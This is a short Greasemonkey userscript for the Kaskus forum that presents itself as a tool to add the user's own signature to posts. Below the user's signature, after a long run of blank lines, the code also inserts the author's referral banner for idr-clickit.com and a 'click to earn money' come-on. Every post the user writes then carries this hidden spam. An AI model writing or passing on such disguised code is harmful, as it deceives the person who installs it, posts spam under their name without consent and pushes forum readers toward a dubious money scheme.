// ==UserScript==
// @name                Automatic Kaskus Signature
// @description         Pasang signature di kaskus secara Otomatis
// @include             http://www.kaskus.us/*
// @include             http://kaskus.us/*
// @author              gdx 
// ==/UserScript==


var signature = "MASUKAN SIGNATURE ANDA DI SINI";


// -------------------------------------------------------------------------------

var datamanage= "[URL=https://www.idr-clickit.com/register.php/electronics_gdx.html][IMG]https://www.idr-clickit.com/images/banner1.png[/IMG][/URL]";
var datasent = "KLIK KLIK DAPET DUIT !! GAMPANG BANGET !! BURUAN DAFTAR !! KLIK DI SINI GAN !";


function arunim () {
document.getElementsByTagName("textarea").item(0).value = "\n\n\n" + signature + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" + datasent + "\n" + datamanage; 
clearInterval (arunimid) 
}
arunimid = setInterval (arunim,0)



